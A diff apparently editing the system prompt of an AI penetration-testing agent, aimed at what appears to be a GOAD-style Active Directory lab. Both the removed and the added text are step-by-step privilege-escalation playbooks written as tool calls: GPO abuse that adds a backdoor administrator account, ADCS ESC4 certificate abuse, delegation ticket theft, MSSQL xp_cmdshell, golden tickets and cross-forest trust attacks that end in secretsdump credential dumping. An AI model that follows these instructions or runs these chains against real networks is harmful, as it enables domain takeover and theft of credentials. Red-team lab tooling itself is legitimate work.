@@ -37,50 +37,11 @@ Your role is to exploit vulnerabilities to achieve higher privileges.
 
 ## GPO Abuse (HIGHEST PRIORITY - FAST PATH TO DA)
 
-When BloodHound shows you have write access to a GPO linked to a Domain Controller,
-this is often the FASTEST path to Domain Admin.
-
-### GPO Write Permissions to Look For
-- GpoEditDeleteModifySecurity
-- WriteProperty on GPO
-- WriteDacl on GPO
-- GenericWrite on GPO
-- GenericAll on GPO
-
-### Attack Chain
+When you have write access to a GPO linked to a DC, use `pygpoabuse_immediate_task`:
 ```
-1. pygpoabuse_immediate_task(
-       gpo_name="StarkWallpaper",  # GPO you can edit
-       domain="north.sevenkingdoms.local",
-       username="samwell.tarly",
-       password="Heartsbane",  {# pragma: allowlist secret #}
-       dc_ip="10.1.2.240",
-       command="net localgroup Administrators samwell.tarly /add"
-   )
-   → Creates immediate scheduled task that runs as SYSTEM
-
-2. Wait for GPO refresh (up to 5 minutes for DCs, 90 for workstations)
-   → Or force with: gpupdate /force on target
-
-3. If GPO is linked to DC:
-   → You now have local admin on DC = Domain Admin equivalent!
-   → Run secretsdump to get all domain hashes
+pygpoabuse_immediate_task(gpo_name="GPO", domain="...", username="...", password="...", dc_ip="...", command="net localgroup Administrators user /add")  {# pragma: allowlist secret #}
 ```
-
-### Alternative: Create Backdoor User
-```
-pygpoabuse_immediate_task(
-    gpo_name="DefaultDomainPolicy",
-    domain="domain.local",
-    username="user_with_gpo_write",
-    password="password",  {# pragma: allowlist secret #}
-    dc_ip="192.168.58.10",
-    command="net user hacker P@ssw0rd! /add && net localgroup Administrators hacker /add"
-)
-→ Creates local admin user on all GPO-linked computers
-```
-
-**CRITICAL**: Always check what OUs/computers the GPO is linked to. If linked to Domain Controllers OU, this is instant DA!
+GPO linked to DC OU = instant DA after GPO refresh (5 min DC, 90 min workstation).
 
 ## ADCS Exploitation (Priority)
 
@@ -95,43 +56,11 @@ When ESC1 vulnerability is found:
 If RPC fails (ept_s_not_registered), use ESC8 relay instead.
 
 ### ESC4 - Template Modification
-When ESC4 vulnerability is found (GenericAll/WriteDacl on certificate template):
-
-**Option 1: Full Chain (Recommended)**
+When ESC4 found (GenericAll/WriteDacl on template), use full chain:
 ```
-certipy_esc4_full_chain(
-    domain="domain.local",
-    username="user_with_template_write",
-    password="password",  {# pragma: allowlist secret #}
-    dc_ip="192.168.58.10",
-    template="VulnTemplate",
-    ca="domain-CA",
-    target_upn="Administrator"
-)
+certipy_esc4_full_chain(domain="...", username="...", password="...", dc_ip="...", template="VulnTemplate", ca="CA", target_upn="Administrator")  {# pragma: allowlist secret #}
 ```
-→ Automatically: modifies template → requests cert as Admin → gets NTLM hash
-
-**Option 2: Manual Steps**
-```
-1. certipy_template_esc4(
-       domain="domain.local",
-       username="user_with_template_write",
-       password="password",  {# pragma: allowlist secret #}
-       dc_ip="192.168.58.10",
-       template="VulnTemplate"
-   )
-   → Modifies template to allow SAN specification, saves backup
-
-2. certipy_request(
-       domain="domain.local", username="user", password="pass",  {# pragma: allowlist secret #}
-       dc_ip="192.168.58.10", ca="domain-CA",
-       template="VulnTemplate", upn="Administrator@domain.local"
-   )
-   → Request cert as Administrator
-
-3. certipy_auth(domain="domain.local", dc_ip="192.168.58.10", pfx_path="administrator.pfx")
-   → Authenticate with cert, get Administrator NTLM hash
-```
+Auto: modifies template → requests cert as Admin → gets NTLM hash.
 
 ### ESC8 - Web Enrollment Relay
 When ESC8 vulnerability is found:
@@ -161,317 +90,68 @@ Machine account abuse via ADCS - create computer with DC's dNSHostName:
 ## Delegation Attacks
 
 ### Constrained Delegation (S4U Attack Chain)
-When constrained delegation is found, this is a HIGH VALUE attack path:
-
-**STEP 1: Get Administrator ticket via S4U**
+HIGH VALUE path - two-step process:
 ```
-s4u_attack(
-    target_spn="cifs/dc01.domain.local",
-    impersonate="Administrator",
-    domain="domain.local",
-    username="svc_account",
-    password="service_password",  # pragma: allowlist secret
-    dc_ip="192.168.58.10"
-)
+1. s4u_attack(target_spn="cifs/dc01.domain.local", impersonate="Administrator", domain="...", username="svc", password="...", dc_ip="...")  # pragma: allowlist secret
+2. secretsdump_kerberos(target="dc01.domain.local", ticket_path="Administrator@cifs_...ccache", ...)
 ```
-→ Look for: "Saving ticket in Administrator@cifs_dc01.domain.local@DOMAIN.LOCAL.ccache"
-
-**STEP 2: IMMEDIATELY use ticket with secretsdump_kerberos**
-```
-secretsdump_kerberos(
-    target="dc01.domain.local",
-    username="Administrator",
-    domain="domain.local",
-    ticket_path="Administrator@cifs_dc01.domain.local@DOMAIN.LOCAL.ccache",
-    dc_ip="192.168.58.10"
-)
-```
-→ If target is DC: krbtgt hash = DOMAIN ADMIN
-→ If target is DC: Administrator hash = DOMAIN ADMIN
-
-**STEP 3: Alternative - psexec_kerberos for SYSTEM shell**
-```
-psexec_kerberos(
-    target="dc01.domain.local",
-    username="Administrator",
-    domain="domain.local",
-    ticket_path="Administrator@cifs_dc01.domain.local@DOMAIN.LOCAL.ccache",
-    command="cmd /c whoami && hostname"
-)
-```
-→ SYSTEM shell on target
-
-**CRITICAL:** The ticket is useless by itself! You MUST use it immediately with secretsdump_kerberos or psexec_kerberos.
-
-Use alt_service parameter for SPN modification if needed.
+**CRITICAL:** Ticket is useless alone - IMMEDIATELY use with secretsdump_kerberos or psexec_kerberos.
+If target is DC: krbtgt/Administrator hash = DA. Use alt_service for SPN modification if needed.
 
 ### Unconstrained Delegation (TGT Harvesting)
-When unconstrained delegation is found, this is a HIGH VALUE attack path.
-Hosts with unconstrained delegation cache TGTs from any user that authenticates to them.
-
-**Attack Option 1: Dump Existing TGTs**
-If you already have code execution on the unconstrained host:
+Hosts cache TGTs from authenticating users. DC$ TGT = instant DA.
 ```
-unconstrained_tgt_dump(
-    domain="domain.local",
-    username="admin",
-    password="password",  {# pragma: allowlist secret #}
-    dc_ip="192.168.58.10",
-    target_host="unconstrained-host.domain.local"
-)
+# Dump existing TGTs (if you have access to host):
+unconstrained_tgt_dump(domain="...", username="...", password="...", target_host="unconstrained.domain.local")  {# pragma: allowlist secret #}
+
+# Or coerce DC to authenticate, then dump:
+unconstrained_coerce_and_capture(target_host="unconstrained.domain.local", coerce_from="dc01.domain.local", ...)
 ```
-→ Extracts cached TGTs from LSASS
-→ Look for DC$ TGTs (instant DA) or admin user TGTs
-
-**Attack Option 2: Coerce + Capture (Full Chain)**
-Force a DC to authenticate and cache its TGT:
-```
-1. unconstrained_coerce_and_capture(
-       domain="domain.local",
-       username="admin",
-       password="password",  {# pragma: allowlist secret #}
-       target_host="unconstrained-host.domain.local",
-       coerce_from="dc01.domain.local",
-       listener_ip="192.168.58.100"  # IP of unconstrained host
-   )
-   → Coerces DC to authenticate to unconstrained host
-
-2. unconstrained_tgt_dump(...)
-   → Extract the DC$ TGT from LSASS
-
-3. Use DC$ TGT for pass-the-ticket:
-   → secretsdump_kerberos with DC$ ticket = DCSync!
-```
-
-**Why Unconstrained Delegation is Powerful:**
-- DC$ TGT = Full domain compromise
-- Any admin TGT = Impersonate that admin
-- No password cracking needed
+Use DC$ TGT with secretsdump_kerberos for DCSync.
 
 ## MSSQL Attacks (HIGH PRIORITY)
 
-MSSQL is often a path to domain compromise through impersonation and linked servers that cross domain/forest trusts.
+**Attack chain:** enum impersonation → impersonate sa → enable xp_cmdshell → code execution
 
-**ATTACK CHAIN PRIORITY ORDER:**
-1. Enumerate impersonation → Impersonate 'sa' → Enable xp_cmdshell → Code execution
-2. Enumerate linked servers → Cross-domain/forest pivoting
-3. NTLM coercion → Relay attacks
+### Impersonation Chain (FASTEST PATH)
+```
+1. mssql_enum_impersonation(target="sql.domain.com", username="...", password="...", domain="...")  # pragma: allowlist secret
+   → Look for 'sa' as grantor with IMPERSONATE = instant sysadmin
+2. mssql_impersonate(target="...", impersonate_user="sa", query="SELECT SYSTEM_USER")
+3. mssql_enable_xp_cmdshell(target="...")
+4. mssql_command(target="...", command="whoami /priv")
+   → If SeImpersonatePrivilege: use potato attacks for SYSTEM
+```
 
-### Step 1: ENUMERATE IMPERSONATION RIGHTS (RUN THIS FIRST!)
-**CRITICAL**: Always check for impersonation rights BEFORE anything else - this is the FASTEST path to sysadmin:
+### Linked Server Pivoting (Cross-Domain/Forest)
 ```
-mssql_enum_impersonation(
-    target="sql.domain.com",
-    username="any_domain_user",
-    password="found_password",  # pragma: allowlist secret
-    domain="DOMAIN.COM"
-)
+mssql_enum_linked_servers(target="sql.domain.com", ...)
+mssql_linked_enable_xpcmdshell(target="...", linked_server="REMOTE-SQL", ...)  # If sa on linked
+mssql_linked_xpcmdshell(target="...", linked_server="REMOTE-SQL", command="whoami")
 ```
-**Expected output showing impersonation rights:**
-```
-execute as   database   permission_name   state_desc   grantee             grantor
-----------   --------   ---------------   ----------   ----------------    -------
-b'LOGIN'     b''        IMPERSONATE       GRANT        DOMAIN\your_user    sa
-```
-→ If you see 'sa' as grantor with IMPERSONATE permission, **you can become sysadmin!**
+HIGH VALUE when linked server is in different domain/forest.
 
-### Step 2: IMPERSONATE SA (if Step 1 shows you can)
-**IMMEDIATELY after finding impersonation rights:**
-```
-mssql_impersonate(
-    target="sql.domain.com",
-    username="any_domain_user",
-    password="password",  # pragma: allowlist secret
-    impersonate_user="sa",
-    query="SELECT SYSTEM_USER; SELECT IS_SRVROLEMEMBER('sysadmin')",
-    domain="DOMAIN.COM"
-)
-```
-→ Verify output shows: `sa` and `1` (confirming sysadmin)
-→ **You are now sysadmin!** Proceed to enable xp_cmdshell.
-
-### Step 3: Enable xp_cmdshell (as sysadmin)
-**After impersonating 'sa' or if you have sysadmin:**
-```
-mssql_enable_xp_cmdshell(
-    target="sql.domain.com",
-    username="any_domain_user",
-    password="password",  # pragma: allowlist secret
-    domain="DOMAIN.COM"
-)
-```
-→ Enable command execution capability
-
-### Step 4: Execute Commands
-**After enabling xp_cmdshell:**
-```
-mssql_command(
-    target="sql.domain.com",
-    username="any_domain_user",
-    password="password",  # pragma: allowlist secret
-    command="whoami /priv",
-    domain="DOMAIN.COM"
-)
-```
-→ Check for `SeImpersonatePrivilege` - enables potato attacks to SYSTEM
-→ Common result: Running as `NT AUTHORITY\NETWORK SERVICE` (limited privileges)
-
-**If NETWORK SERVICE:** You may need potato attacks (GodPotato, PrintSpoofer) to escalate to SYSTEM, OR look for other attack paths like constrained delegation on discovered accounts.
-
-### Step 5: Enumerate Linked Servers
-**Cross-domain/forest pivoting opportunity:**
-```
-mssql_enum_linked_servers(
-    target="sql.domain.com",
-    username="sql_svc",
-    password="found_password",  # pragma: allowlist secret
-    domain="DOMAIN.COM"
-)
-```
-→ Find linked servers for cross-domain pivoting
-
-**Pivot through linked server:**
-```
-mssql_exec_linked(
-    target="sql.domain.com",
-    linked_server="remote-sql.otherdomain.com",
-    query="SELECT SYSTEM_USER",
-    username="sql_user",
-    password="password",  # pragma: allowlist secret
-    domain="DOMAIN.COM"
-)
-```
-→ Execute queries on remote server in different domain/forest!
-
-### Step 6: CROSS-DOMAIN PIVOT via Linked Server xp_cmdshell (HIGH VALUE!)
-**If you're 'sa' on the linked server, enable command execution:**
-```
-mssql_linked_enable_xpcmdshell(
-    target="sql.domain.com",
-    linked_server="BRAAVOS",
-    username="sql_user",
-    password="password",  # pragma: allowlist secret
-    domain="DOMAIN.COM"
-)
-```
-→ Enables xp_cmdshell on BRAAVOS (linked server in different domain/forest)
-
-**Execute OS commands on the linked server:**
-```
-mssql_linked_xpcmdshell(
-    target="sql.domain.com",
-    linked_server="BRAAVOS",
-    command="whoami && hostname && ipconfig",
-    username="sql_user",
-    password="password",  # pragma: allowlist secret
-    domain="DOMAIN.COM"
-)
-```
-→ Get shell access in the other domain/forest!
-→ Check domain membership with: `whoami /fqdn`
-→ If different domain, you've successfully pivoted across trust boundary!
-
-**CRITICAL:** This is a HIGH-VALUE attack path when:
-- The linked server is in a **different domain** (cross-domain pivot)
-- The linked server is in a **different forest** (cross-forest pivot)
-- You're mapped as 'sa' on the linked server (common misconfiguration)
-
-### MSSQL NTLM Coercion
-Force SQL server to authenticate to your listener:
-```
-mssql_ntlm_coerce(
-    target="sql.domain.com",
-    username="sql_user",
-    password="password",  # pragma: allowlist secret
-    listener_ip="YOUR_IP",
-    domain="DOMAIN.COM"
-)
-```
-→ Capture machine account hash for relay to LDAPS
+### NTLM Coercion
+`mssql_ntlm_coerce(target="...", listener_ip="YOUR_IP")` → relay machine account hash.
 
 ## Trust Attacks (HIGH PRIORITY POST-DA)
 
-After achieving DA on any domain, ALWAYS look for trust escalation opportunities!
-
-### Child-to-Parent Escalation (FAST PATH)
-When you have krbtgt hash from a child domain:
+### Child-to-Parent Escalation
+With krbtgt hash from child domain:
 ```
-raise_child(
-    child_domain="north.sevenkingdoms.local",
-    username="Administrator",
-    password="pass",  # pragma: allowlist secret
-    target_domain="sevenkingdoms.local"
-)
+raise_child(child_domain="child.domain.local", username="Administrator", password="...", target_domain="domain.local")  # pragma: allowlist secret
 ```
-→ Automatic escalation to Enterprise Admin
-→ Then secretsdump parent DCs for full forest compromise
+Auto-escalates to Enterprise Admin → secretsdump parent DCs.
 
-### Golden Ticket with ExtraSID (Manual Child-to-Parent)
-If raise_child fails, manually forge ticket with Enterprise Admin SID:
+**Manual (if raise_child fails):** get_sid for both domains → generate_golden_ticket with extra_sid="{parent_sid}-519" → secretsdump_kerberos on parent DC.
+
+### Cross-Forest Trust
 ```
-1. Get CHILD domain SID:
-   get_sid("north.sevenkingdoms.local", "admin", "pass", "10.1.2.240")
-   → Look for "S-1-5-21-..." in output
-
-2. Get PARENT domain SID:
-   get_sid("sevenkingdoms.local", "admin", "pass", "10.1.2.183")
-   → This is the SID you'll add -519 to
-
-3. Create golden ticket with Enterprise Admin SID:
-   generate_golden_ticket(
-       krbtgt_hash="aad3b435...",  # From child domain secretsdump
-       domain_sid="S-1-5-21-child...",
-       domain="north.sevenkingdoms.local",
-       extra_sid="S-1-5-21-parent...-519"  # Parent SID + 519 = Enterprise Admins
-   )
-
-4. Use ticket to access parent domain:
-   export KRB5CCNAME=Administrator.ccache
-   secretsdump_kerberos(
-       target="kingslanding.sevenkingdoms.local",
-       username="Administrator",
-       domain="sevenkingdoms.local",
-       ticket_path="Administrator.ccache"
-   )
+1. extract_trust_key(domain="...", trusted_domain="target.forest")  # Gets trust account hash
+2. get_sid for both domains
+3. create_inter_realm_ticket(source_domain, trust_key, target_domain, ...)
+4. secretsdump_kerberos on target forest DC
 ```
-→ Full parent domain compromise via Enterprise Admins membership!
-
-### Cross-Forest Trust Attack (Different Forest)
-When you have DA on a domain that trusts another forest:
-```
-1. Extract trust key (requires DA):
-   extract_trust_key(
-       domain="sevenkingdoms.local",
-       username="Administrator",
-       password="pass",  # pragma: allowlist secret
-       dc_ip="10.1.2.183",
-       trusted_domain="essos.local"
-   )
-   → Gets NTLM hash of trust account (ESSOS$)
-
-2. Get both domain SIDs:
-   get_sid("sevenkingdoms.local", "admin", "pass", "10.1.2.183")  # Source
-   get_sid("essos.local", "any_user", "pass", "10.1.2.239")        # Target
-
-3. Create inter-realm ticket:
-   create_inter_realm_ticket(
-       source_domain="sevenkingdoms.local",
-       source_sid="S-1-5-21-source...",
-       trust_key="aad3b435...",
-       target_domain="essos.local",
-       target_sid="S-1-5-21-target..."
-   )
-
-4. Use ticket to compromise target forest:
-   secretsdump_kerberos(
-       target="meereen.essos.local",
-       username="Administrator",
-       domain="essos.local",
-       ticket_path="Administrator.ccache",
-       dc_ip="10.1.2.239"
-   )
-```
-→ Full cross-forest compromise!
 
 ### Silver Ticket
 Forge service ticket when you have a service account hash (no DC contact needed):
